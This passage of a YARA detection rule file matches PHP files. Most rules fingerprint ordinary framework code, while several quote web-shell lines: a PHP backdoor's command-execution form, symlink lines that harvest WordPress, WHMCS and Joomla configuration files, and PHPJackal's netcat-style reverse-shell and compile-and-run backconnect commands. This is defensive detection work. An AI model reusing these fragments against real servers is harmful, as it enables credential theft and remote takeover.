      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ParserNodeFunctionEvaluator
{
   meta:
      description = "php22 - file ParserNodeFunctionEvaluator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "eccc7c2c9e750ac275c74dc348ebe90546905d35365b2ae8db307078b0a2298d"
   strings:
      $x1 = "* @param Logger $logger A Monolog logger, used to dump debugging info for authorization evaluations." fullword ascii
      $x2 = "* @license   https://github.com/userfrosting/UserFrosting/blob/master/licenses/UserFrosting.md (MIT License)" fullword ascii
      $x3 = "* @see http://www.userfrosting.com/components/#authorization" fullword ascii
      $x4 = "* @author Alex Weissman (https://alexanderweissman.com)" fullword ascii
      $x5 = "* UserFrosting (http://www.userfrosting.com)" fullword ascii
      $s6 = "* @param bool $debug Set to true if you want debugging information printed to the auth log." fullword ascii
      $s7 = "* @link      https://github.com/userfrosting/UserFrosting" fullword ascii
      $s8 = "* @var bool Set to true if you want debugging information printed to the auth log." fullword ascii
      $s9 = "* Resolve a parameter path (e.g. \"user.id\", \"post\", etc) into its value." fullword ascii
      $s10 = "* @param array $params The parameters to be used when evaluating the methods in the condition expression, as an array." fullword ascii
      $s11 = "* @throws Exception the path could not be resolved.  Path is malformed or key does not exist." fullword ascii
      $s12 = "* @var array The parameters to be used when evaluating the methods in the condition expression, as an array." fullword ascii
      $s13 = "* @param string $path the name of the parameter to resolve, based on the parameters set in this object." fullword ascii
      $s14 = "* @var \\PhpParser\\PrettyPrinter\\Standard The PrettyPrinter object to use (initialized in the ctor)" fullword ascii
      $s15 = "* @var Logger" fullword ascii
      $s16 = "$this->logger->debug(\"Result: \" . ($result ? \"1\" : \"0\"));" fullword ascii
      $s17 = "* Resolve an array expression in a condition expression into an actual array." fullword ascii
      $s18 = "* @var array[callable] An array of callback functions to be used when evaluating a condition expression." fullword ascii
      $s19 = "if (($arg->value instanceof \\PhpParser\\Node\\Expr\\BinaryOp\\Concat) || ($arg->value instanceof \\PhpParser\\Node\\Exp" fullword ascii
      $s20 = "throw new AuthorizationException(\"Authorization failed: Access condition method '$callbackName' does not exist.\"" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule ProductCompare
{
   meta:
      description = "php22 - file ProductCompare.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c8b30206ae0f0d906333b2c705ca3d26ab5d83df580f10dba3b88605e6b9960a"
   strings:
      $s1 = "$products = ProductCompareHelper::getProductsList(boolval($this->fetchProducts));" fullword ascii
      $s2 = "use app\\modules\\shop\\helpers\\ProductCompareHelper;" fullword ascii
      $s3 = "namespace app\\modules\\shop\\widgets;" fullword ascii
      $s4 = "* @inheritdoc" fullword ascii
      $s5 = "class ProductCompare extends Widget" fullword ascii
      $s6 = "public $viewFile = 'product-compare/list';" fullword ascii
      $s7 = "use yii\\base\\Widget;" fullword ascii
      $s8 = "return $this->render($this->viewFile, [" fullword ascii
      $s9 = "'additional' => $this->additional," fullword ascii
      $s10 = "parent::run();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule radio_blade
{
   meta:
      description = "php22 - file radio.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bf9c4e3620ea44fdd5034f381f848707bd8d580bf082f29908c783b30594c480"
   strings:
      $s1 = "<?php $oldValue = (isset($dbSettings[$settingName]) && $dbSettings[$settingName]->hasTranslation($lang)) ? $dbSettings[$" fullword ascii
      $s2 = "{{ isset($dbSettings[$settingName]) && (bool)$oldValue == $value ? 'checked' : '' }}" fullword ascii
      $s3 = "<?php foreach ($moduleInfo['options'] as $value => $optionName): ?>" fullword ascii
      $s4 = "settingName]->translate($lang)->value : ''; ?>" fullword ascii
      $s5 = "<label for=\"{{ $optionName . \"[$lang]\" }}\">" fullword ascii
      $s6 = "name=\"{{ $settingName . \"[$lang]\" }}\"" fullword ascii
      $s7 = "<input id=\"{{ $optionName . \"[$lang]\" }}\"" fullword ascii
   condition:
      uint16(0) == 0x643c and filesize < 2KB and
      all of them
}

rule PropertiesController
{
   meta:
      description = "php22 - file PropertiesController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "147aa2684ce96af8f1c2ccddb96e48270f22c4cfba3cc11a21e41ad969702857"
   strings:
      $s1 = ")->execute();" fullword ascii
      $s2 = "public function actionAddStaticValue($key, $value, $returnUrl, $objectId = null, $objectModelId = null)" fullword ascii
      $s3 = "$returnUrl = Yii::$app->request->get('returnUrl', ['/backend/properties/index']);" fullword ascii
      $s4 = "$tags[] = ActiveRecordHelper::getCommonTag(Object::findById($objectId)->object_class);" fullword ascii
      $s5 = "if ($model->key != $model->getOldAttribute('key')) {" fullword ascii
      $s6 = "Yii::$app->session->setFlash('success', Yii::t('app', 'Record has been saved'));" fullword ascii
      $s7 = "if ($model->load(Yii::$app->request->post()) && $model->save()) {" fullword ascii
      $s8 = "if ($model->load(\\Yii::$app->request->post()) && $model->validate()) {" fullword ascii
      $s9 = "->addColumn($submissionObject->column_properties_table_name, $model->key, $col_type)" fullword ascii
      $s10 = "private function getColumnType($value_type)" fullword ascii
      $s11 = "if ($model->value_type != $model->getOldAttribute('value_type')) {" fullword ascii
      $s12 = "ActiveRecordHelper::getObjectTag(PropertyGroup::className(), $property->property_group_id)," fullword ascii
      $s13 = "use app\\modules\\image\\widgets\\views\\AddImageAction;" fullword ascii
      $s14 = "->addColumn($object->column_properties_table_name, $model->key, $col_type)" fullword ascii
      $s15 = "Yii::$app->session->setFlash('danger', Yii::t('app', 'Object removed'));" fullword ascii
      $s16 = "Yii::$app->db->createCommand()" fullword ascii
      $s17 = "$model->getOldAttribute('key')," fullword ascii
      $s18 = "if ($model->load($post) && $model->validate()) {" fullword ascii
      $s19 = "Yii::$app->session->setFlash('error', Yii::t('app', 'Cannot save data'));" fullword ascii
      $s20 = "use app\\modules\\image\\widgets\\SaveInfoAction;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule ProductAttributeTranslationType
{
   meta:
      description = "php22 - file ProductAttributeTranslationType.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c65ce9eca385706824527ffb14e2499d2851e256d1f6f33f57fe9107f26b9f61"
   strings:
      $s1 = "public function getBlockPrefix(): string" fullword ascii
      $s2 = "use Sylius\\Bundle\\AttributeBundle\\Form\\Type\\AttributeTranslationType;" fullword ascii
      $s3 = "namespace Sylius\\Bundle\\ProductBundle\\Form\\Type;" fullword ascii
      $s4 = "final class ProductAttributeTranslationType extends AttributeTranslationType" fullword ascii
      $s5 = "return 'sylius_product_attribute_translation';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_Redis
{
   meta:
      description = "php22 - file Redis.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "edc008d157b7df5c861df18f7494a985e92b2ead521a5e6db61447b411443ad3"
   strings:
      $x1 = "* @author TIERGB <https://github.com/TIGERB>" fullword ascii
      $s2 = "*      <https://github.com/TIGERB>         *" fullword ascii
      $s3 = "$redis->connect($config['host'], $config['port']);" fullword ascii
      $s4 = "* A lightweight PHP framework for studying *" fullword ascii
      $s5 = "$config = App::$container->getSingle('config');" fullword ascii
      $s6 = "* Init redis" fullword ascii
      $s7 = "*                Easy PHP                  *" fullword ascii
      $s8 = "*                 TIERGB                   *" fullword ascii
      $s9 = "* redis" fullword ascii
      $s10 = "*                                          *" fullword ascii
      $s11 = "$config = $config->config['redis'];" fullword ascii
      $s12 = "namespace Framework\\Nosql;" fullword ascii
      $s13 = "$redis = new rootRedis();" fullword ascii
      $s14 = "* Redis class" fullword ascii
      $s15 = "use Redis as rootRedis;" fullword ascii
      $s16 = "use Framework\\App;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule overloadable_php5
{
   meta:
      description = "php22 - file overloadable_php5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "40ea1c80ac74bd99a2684cf21da6e4fc5c78445869a0ec3835ed245dbeb9f0e5"
   strings:
      $s1 = "trigger_error(sprintf(__('Magic method handler call__ not defined in %s', true), get_class($this)), E_USER_ERROR);" fullword ascii
      $s2 = "* Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s3 = "* CakePHP(tm) : Rapid Development Framework (http://cakephp.org)" fullword ascii
      $s4 = "* @license       MIT License (http://www.opensource.org/licenses/mit-license.php)" fullword ascii
      $s5 = "* @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s6 = "* Overload abstraction interface.  Merges differences between PHP4 and 5." fullword ascii
      $s7 = "* @param mixed $name What to get" fullword ascii
      $s8 = "* Redistributions of files must retain the above copyright notice." fullword ascii
      $s9 = "* Overload implementation. No need for implementation in PHP5." fullword ascii
      $s10 = "* @param array $params Parameters to send to method" fullword ascii
      $s11 = "* @param mixed $value Where to store returned value" fullword ascii
      $s12 = "* @return mixed Return value from method" fullword ascii
      $s13 = "* Load the interface class based on the version of PHP." fullword ascii
      $s14 = "* Licensed under The MIT License" fullword ascii
      $s15 = "* @param mixed $name What to set" fullword ascii
      $s16 = "* @link          http://cakephp.org CakePHP(tm) Project" fullword ascii
      $s17 = "* Magic method handler." fullword ascii
      $s18 = "* Setter." fullword ascii
      $s19 = "return $this->get__($name);" fullword ascii
      $s20 = "function __get($name) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule ParameterConfirmationTokenTest_Token
{
   meta:
      description = "php22 - file ParameterConfirmationTokenTest_Token.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e41ffc9ba367f595b67646cf554aa15f878786997267d2037de3e3eeb4a8ba62"
   strings:
      $s1 = "* Dummy parameter token" fullword ascii
      $s2 = "namespace SilverStripe\\Core\\Tests\\Startup\\ParameterConfirmationTokenTest;" fullword ascii
      $s3 = "class ParameterConfirmationTokenTest_Token extends ParameterConfirmationToken implements TestOnly" fullword ascii
      $s4 = "use SilverStripe\\Core\\Startup\\ParameterConfirmationToken;" fullword ascii
      $s5 = "use SilverStripe\\Dev\\TestOnly;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_pwhash
{
   meta:
      description = "php22 - file pwhash.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cfccc4dc2ee493e35cacab4aee80f2ec6386441afc309bd6e9ea5e481ab1a47a"
   strings:
      $s1 = "* pwhash.php file for PHP Shell 2.1" fullword ascii
      $s2 = "<title>Password Hasher for PHP Shell 2.1</title>" fullword ascii
      $s3 = "latest version at <a href=\"http://mgeisler.net/php-shell/\">mgeisler.net/php-shell/</a>." fullword ascii
      $s4 = "<h1>Password Hasher for PHP Shell 2.1</h1>" fullword ascii
      $s5 = "$password = isset($_POST['password']) ? $_POST['password'] : '';" fullword ascii
      $s6 = "* Copyright (C) 2005 Martin Geisler <mgeisler@mgeisler.net>" fullword ascii
      $s7 = "Copyright &copy; 2005, <a href=\"mailto:mgeisler@mgeisler.net\">Martin Geisler</a>. Get the" fullword ascii
      $s8 = "<input name=\"password\" type=\"text\" value=\"<?php echo $password ?>\">" fullword ascii
      $s9 = "echo \"  <p><i>Enter a username and a password and update.</i></p>\\n\";" fullword ascii
      $s10 = "$username = isset($_POST['username']) ? $_POST['username'] : '';" fullword ascii
      $s11 = "* Licensed under the GNU GPL.  See the file COPYING for details." fullword ascii
      $s12 = "\"<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pipe)," fullword ascii
      $s13 = "$hash = $fkt . ':' . $salt . ':' . $fkt($salt . $password);" fullword ascii
      $s14 = "echo \"  <p>Write the following line into <tt>config.php</tt> \" ." fullword ascii
      $s15 = "\"in the <tt>users</tt> section:</p>\\n\";" fullword ascii
      $s16 = "if ($username == '' || $password == '') {" fullword ascii
      $s17 = "<form action=\"<?php $_SERVER['PHP_SELF']; ?>\" method=\"POST\">" fullword ascii
      $s18 = "echo htmlentities(str_pad($username, 8) . ' = \"' . $hash . '\"') . \"\\n\";" fullword ascii
      $s19 = "echo '  <p>Please choose another username and try again.</p>' . \"\\n\";" fullword ascii
      $s20 = "<input name=\"username\" type=\"text\" value=\"<?php echo $username ?>\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule RegisterCalculatorsPassSpec
{
   meta:
      description = "php22 - file RegisterCalculatorsPassSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6f136c500fab5c89c8a6fc13d97c37def5b5b45857537969998dfa0f7a09d26d"
   strings:
      $s1 = "use Symfony\\Component\\DependencyInjection\\Compiler\\CompilerPassInterface;" fullword ascii
      $s2 = "namespace spec\\Sylius\\Bundle\\TaxationBundle\\DependencyInjection\\Compiler;" fullword ascii
      $s3 = "function it_processes_the_calculators_services(ContainerBuilder $container, Definition $calculator): void" fullword ascii
      $s4 = "use Symfony\\Component\\DependencyInjection\\Definition;" fullword ascii
      $s5 = "$this->process($container);" fullword ascii
      $s6 = "$container->getDefinition('sylius.registry.tax_calculator')->shouldBeCalled()->willReturn($calculator);" fullword ascii
      $s7 = "$container->findTaggedServiceIds('sylius.tax_calculator')->shouldBeCalled()->willReturn([" fullword ascii
      $s8 = "function it_is_a_compiler_pass(): void" fullword ascii
      $s9 = "$this->shouldImplement(CompilerPassInterface::class);" fullword ascii
      $s10 = "$container->hasDefinition('sylius.registry.tax_calculator')->shouldBeCalled()->willReturn(true);" fullword ascii
      $s11 = "final class RegisterCalculatorsPassSpec extends ObjectBehavior" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule OrderDiscount
{
   meta:
      description = "php22 - file OrderDiscount.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "45dd9c2a615016a67fc4adde5ef1ab765f4ad101998a93231083359806da09a2"
   strings:
      $s1 = "* @property integer $discount_id" fullword ascii
      $s2 = "* @property string $applied_date" fullword ascii
      $s3 = "* @property integer $order_id" fullword ascii
      $s4 = "public function checkDiscount(Discount $discount, Product $product = null, Order $order = null)" fullword ascii
      $s5 = "$q = self::find()->where(['discount_id' => $discount->id, 'order_id' => $order->id])->count();" fullword ascii
      $s6 = "* This is the model class for table \"{{%order_discount}}\"." fullword ascii
      $s7 = "* @property integer $id" fullword ascii
      $s8 = "* @inheritdoc" fullword ascii
      $s9 = "public function getFullName()" fullword ascii
      $s10 = "'applied_date' => Yii::t('app', 'Applied Date')," fullword ascii
      $s11 = "[['order_id', 'discount_id'], 'integer']," fullword ascii
      $s12 = "[['order_id', 'discount_id'], 'required']," fullword ascii
      $s13 = "'discount_id' => Yii::t('app', 'Discount ID')," fullword ascii
      $s14 = "'order_id' => Yii::t('app', 'Order ID')," fullword ascii
      $s15 = "public function attributeLabels()" fullword ascii
      $s16 = "namespace app\\modules\\shop\\models;" fullword ascii
      $s17 = "public static function tableName()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule preload_inc
{
   meta:
      description = "php22 - file preload.inc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fb1b4b96b1c5c687e1b86a9960b3bc7c87488b15cd61bd1c469596929375c7a0"
   strings:
      $s1 = "$_lang['preload_err_cache'] = 'Make sure your [[+path]]cache directory exists and is writable by the PHP process.';" fullword ascii
      $s2 = "$_lang['preload_err_pdo'] = 'MODX memerlukan PDO extension ketika PDO asli yang digunakan, dan itu tampaknya tidak dimuat.';" fullword ascii
      $s3 = "* English Preload Lexicon Topic for Revolution setup" fullword ascii
      $s4 = "* @subpackage lexicon" fullword ascii
      $s5 = "* @package setup" fullword ascii
      $s6 = "$_lang['preload_err_core_path'] = 'Make sure you have specified a valid MODX_CORE_PATH in your setup/includes/config.core.php fi" ascii
      $s7 = "$_lang['preload_err_core_path'] = 'Make sure you have specified a valid MODX_CORE_PATH in your setup/includes/config.core.php fi" ascii
      $s8 = "le; this must point to a working MODX core.';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ReaderRefer
{
   meta:
      description = "php22 - file ReaderRefer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6a569e38a80b1212d1e5c7155d27b2d5a88c115706231a3bf99f48b7cf1af097"
   strings:
      $s1 = "* Author: Ma Bingyao <andot@hprose.com>                  *" fullword ascii
      $s2 = "* Hprose/ReaderRefer.php                                 *" fullword ascii
      $s3 = "| Official WebSite: http://www.hprose.com/                 |" fullword ascii
      $s4 = "* hprose reader reference interface for php 5.3+         *" fullword ascii
      $s5 = "* LastModified: Jul 11, 2016                             *" fullword ascii
      $s6 = "\\**********************************************************/" fullword ascii
      $s7 = "|                   http://www.hprose.org/                 |" fullword ascii
      $s8 = "/**********************************************************\\" fullword ascii
      $s9 = "public function read($index);" fullword ascii
      $s10 = "interface ReaderRefer {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule Php_Backdoor
{
   meta:
      description = "php22 - file Php_Backdoor.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f6e8b9f756519fbe2f23b298a7c1e135635d5b94e3d48f47ea6990433ac70c2b"
   strings:
      $s1 = "<a href=\"?action=shell\">Execute a shell code</a><br>';" fullword ascii
      $s2 = "echo 'The shell code <b>'.$cmd.'</b> as been executed on server.<br>';" fullword ascii
      $s3 = "echo 'HTTP Heading Connection Protocol:<b> '.$HTTP_CONNECTION.'</b><br>';" fullword ascii
      $s4 = "echo '<input type=\"submit\" value=\"Execute\"></form>';" fullword ascii
      $s5 = "echo '<input type=\"text\" name=\"recpt\" size=\"30\" value=\"fucker@small-dick.com\"><br>';" fullword ascii
      $s6 = "<a href=\"?action=php\">Execute a php code</a><br>';" fullword ascii
      $s7 = "echo 'HTTP Heading Host Protocol:<b> '.$HTTP_HOST.'</b>';" fullword ascii
      $s8 = "echo 'The php code <b>'.$cmd.'</b> as been executed.<br>';" fullword ascii
      $s9 = "echo '<center><img src=\"http://img418.imageshack.us/img418/3218/jerem9sn.png\" alt=\"Owned by ^Jerem\"></center>';" fullword ascii
      $s10 = "echo '<input type=\"text\" name=\"exp\" size=\"30\" value=\"you@ownz.com\"><br>';" fullword ascii
      $s11 = "echo 'File name: <input type=\"text\" name=\"nfile\" size=\"30\" value=\"you-file.txt\"><br>  ';" fullword ascii
      $s12 = "echo 'New name: <input type=\"text\" name=\"newfile\" size=\"30\" value=\"you-new-file.txt\">  ';" fullword ascii
      $s13 = "//echo '<input type=\"text\" name=\"cmd\" size=\"50\" value=\"ls -a\">  ';" fullword ascii
      $s14 = "echo 'HTTP User Agent:<b> '.$HTTP_USER_AGENT.'</b><br>';" fullword ascii
      $s15 = "echo 'File name: <input type=\"text\" name=\"nfile\" size=\"30\" value=\"you-file.txt\">  ';" fullword ascii
      $s16 = "echo '<link rel=\"stylesheet\" href=\"http://membres.lycos.fr/webchat/style.css\" type=\"text/css\">';" fullword ascii
      $s17 = "echo '<input type=\"text\" name=\"fts\" size=\"30\" value=\"your-file.txt\">  ';" fullword ascii
      $s18 = "echo 'This backdoor coded in php allows<br>';" fullword ascii
      $s19 = "echo 'Server ip:<b> '.$SERVER_ADDR.'</b> (Running on port<b> '.$SERVER_PORT.'</b>)<br>';" fullword ascii
      $s20 = "echo '<form method=\"POST\" action=\"?action=shellgo\">';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule ProjectProfileFile
{
   meta:
      description = "php22 - file ProjectProfileFile.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "aa3b158e0969ad8d612adc1fb03fe329465f47ecf54913036163b26395d57d96"
   strings:
      $s1 = "* getContents()" fullword ascii
      $s2 = "* @version    $Id: ProjectProfileFile.php 20096 2010-01-06 02:05:09Z bkarwin $" fullword ascii
      $s3 = "* @return Zend_Tool_Project_Context_System_ProjectProfileFile" fullword ascii
      $s4 = "* @see Zend_Tool_Project_Context_Filesystem_File" fullword ascii
      $s5 = "* @see Zend_Tool_Project_Context_System_NotOverwritable" fullword ascii
      $s6 = "* @see Zend_Tool_Project_Context_System_Interface" fullword ascii
      $s7 = "// require_once 'Zend/Tool/Project/Context/Filesystem/File.php';" fullword ascii
      $s8 = "// require_once 'Zend/Tool/Project/Context/System/Interface.php';" fullword ascii
      $s9 = "// require_once 'Zend/Tool/Project/Context/System/NotOverwritable.php';" fullword ascii
      $s10 = "* getName()" fullword ascii
      $s11 = "* @param Zend_Tool_Project_Profile $profile" fullword ascii
      $s12 = "* @see Zend_Tool_Project_Profile_FileParser_Xml" fullword ascii
      $s13 = "* Proxy to create" fullword ascii
      $s14 = "* items within a specific project." fullword ascii
      $s15 = "* @var Zend_Tool_Project_Profile" fullword ascii
      $s16 = "* This class is the front most class for utilizing Zend_Tool_Project" fullword ascii
      $s17 = "* A profile is a hierarchical set of resources that keep track of" fullword ascii
      $s18 = "protected $_filesystemName = '.zfproject.xml';" fullword ascii
      $s19 = "$profile = $this->_resource->getProfile();" fullword ascii
      $s20 = "// require_once 'Zend/Tool/Project/Profile/FileParser/Xml.php';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule ProductVariantTranslationType
{
   meta:
      description = "php22 - file ProductVariantTranslationType.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b61384efcd8b011a8ba02d88a1f299f41745fe163aaccd8dc5bab00bf9307ff9"
   strings:
      $s1 = "use Symfony\\Component\\Form\\Extension\\Core\\Type\\TextType;" fullword ascii
      $s2 = "public function getBlockPrefix(): string" fullword ascii
      $s3 = "public function buildForm(FormBuilderInterface $builder, array $options): void" fullword ascii
      $s4 = "use Symfony\\Component\\Form\\FormBuilderInterface;" fullword ascii
      $s5 = "use Sylius\\Bundle\\ResourceBundle\\Form\\Type\\AbstractResourceType;" fullword ascii
      $s6 = "namespace Sylius\\Bundle\\ProductBundle\\Form\\Type;" fullword ascii
      $s7 = "return 'sylius_product_variant_translation';" fullword ascii
      $s8 = "'label' => 'sylius.form.product_variant.name'," fullword ascii
      $s9 = "final class ProductVariantTranslationType extends AbstractResourceType" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php22_q
{
   meta:
      description = "php22 - file q.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "18a08671a4dfffb279278c13ffa17c2c98d91fb90e67e2a7dcc9b0d9136fd4e1"
   strings:
      $s1 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/hosting/configuration.php',\"pee/\".$etcc[0].'-WHMCS.txt');" fullword ascii
      $s2 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/blog/wp-config.php',\"pee/\".$etcc[0].'-WordPress.txt');" fullword ascii
      $s3 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/supportes/configuration.php',\"pee/\".$etcc[0].'-WHMCS.txt');" fullword ascii
      $s4 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/portal/configuration.php',\"pee/\".$etcc[0].'-WHMCS.txt');" fullword ascii
      $s5 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/support/configuration.php',\"pee/\".$etcc[0].'-WHMCS.txt');" fullword ascii
      $s6 = "echo \" &nbsp;&nbsp;&nbsp;&nbsp; [ CODED by P-74 ] [<a href='https://www.facebook.com/BDCyberArmy'> BANGLADESH CYBER ARMY <a>]\"" ascii
      $s7 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/config.php',\"pee/\".$etcc[0].'-vBulletin.txt');" fullword ascii
      $s8 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/configure.php',\"pee/\".$etcc[0].'-osCommerce.txt');" fullword ascii
      $s9 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/order/configuration.php',\"pee/\".$etcc[0].'-WHMCS.txt');" fullword ascii
      $s10 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmcs/configuration.php',\"pee/\".$etcc[0].'-WHMCS.txt');" fullword ascii
      $s11 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/joomla/configuration.php',\"pee/\".$etcc[0].'-Joomla.txt');" fullword ascii
      $s12 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientarea/configuration.php',\"pee/\".$etcc[0].'-WHMCS.txt');" fullword ascii
      $s13 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/configuration.php',\"pee/\".$etcc[0].'-Joomla.txt');" fullword ascii
      $s14 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/billing/configuration.php',\"pee/\".$etcc[0].'-WHMCS.txt');" fullword ascii
      $s15 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientes/configuration.php',\"pee/\".$etcc[0].'-WHMCS.txt');" fullword ascii
      $s16 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/client/configuration.php',\"pee/\".$etcc[0].'-WHMCS.txt');" fullword ascii
      $s17 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domain/configuration.php',\"pee/\".$etcc[0].'-WHMCS.txt');" fullword ascii
      $s18 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domains/configuration.php',\"pee/\".$etcc[0].'-WHMCS.txt');" fullword ascii
      $s19 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp-config.php',\"pee/\".$etcc[0].'-WordPress.txt');" fullword ascii
      $s20 = "symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp/wp-config.php',\"pee/\".$etcc[0].'-WordPress.txt');" fullword ascii
   condition:
      uint16(0) == 0x733c and filesize < 40KB and
      8 of them
}

rule ProductTaxonSpec
{
   meta:
      description = "php22 - file ProductTaxonSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4bf211876582f3f3de15daa0a5809b35d7c14a05f32716e223850589b711f597"
   strings:
      $s1 = "$this->getTaxon()->shouldReturn($taxon);" fullword ascii
      $s2 = "$this->getProduct()->shouldReturn($product);" fullword ascii
      $s3 = "use Sylius\\Component\\Core\\Model\\ProductTaxonInterface;" fullword ascii
      $s4 = "$this->getPosition()->shouldReturn(1);" fullword ascii
      $s5 = "use Sylius\\Component\\Core\\Model\\ProductInterface;" fullword ascii
      $s6 = "use Sylius\\Component\\Core\\Model\\TaxonInterface;" fullword ascii
      $s7 = "namespace spec\\Sylius\\Component\\Core\\Model;" fullword ascii
      $s8 = "function it_has_mutable_product_field(ProductInterface $product): void" fullword ascii
      $s9 = "function it_has_mutable_taxon_field(TaxonInterface $taxon): void" fullword ascii
      $s10 = "function it_implements_product_taxon_interface(): void" fullword ascii
      $s11 = "function it_has_mutable_position_field(): void" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule ProductVariantTranslationInterface
{
   meta:
      description = "php22 - file ProductVariantTranslationInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "90843763ab95d03debae3066aea28717b17c6b2b2c43a146d57492438f3457c0"
   strings:
      $s1 = "* @param string|null $name" fullword ascii
      $s2 = "interface ProductVariantTranslationInterface extends ResourceInterface, TranslationInterface" fullword ascii
      $s3 = "use Sylius\\Component\\Resource\\Model\\TranslationInterface;" fullword ascii
      $s4 = "use Sylius\\Component\\Resource\\Model\\ResourceInterface;" fullword ascii
      $s5 = "public function getName(): ?string;" fullword ascii
      $s6 = "namespace Sylius\\Component\\Product\\Model;" fullword ascii
      $s7 = "public function setName(?string $name): void;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule phpjackal1_3
{
   meta:
      description = "php22 - file phpjackal1.3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6d5d8b5a07ffd074de611ecbbed94b2e2afde1240e856a5ac692e8856de3d1e9"
   strings:
      $x1 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii
      $x2 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii
      $x3 = "elseif ($windows && is_object($ws = new COM(\"WScript.Shell\"))){$dir=(isset($_SERVER[\"TEMP\"]))?$_SERVER[\"TEMP\"]:ini_get('up" ascii
      $x4 = "mp_dir') ;$name = $_SERVER[\"TEMP\"].namE();$ws->Run(\"cmd.exe /C $command >$name\", 0, true);$exec = file_get_contents($name);u" ascii
      $x5 = "$alias=\"<option value=\\\"netstat -an | grep -i listen\\\">Display open ports</option><option value=\\\"last -a -n 250 -i\\\">S" ascii
      $x6 = "echo \"<br><table border=0 cellpadding=0 cellspacing=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" bgcol" ascii
      $x7 = "$footer=\"${msgbox}PHPJackal v$v - Powered By <a href=\\\"http://netjackal.by.ru\\\" target=\\\"_blank\\\">NetJackal</a>$et\";" fullword ascii
      $x8 = "$alias=\"<option value=\\\"netstat -an\\\">Display open ports</option><option value=\\\"tasklist\\\">List of processes</option><" ascii
      $x9 = "if(!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &\");" fullword ascii
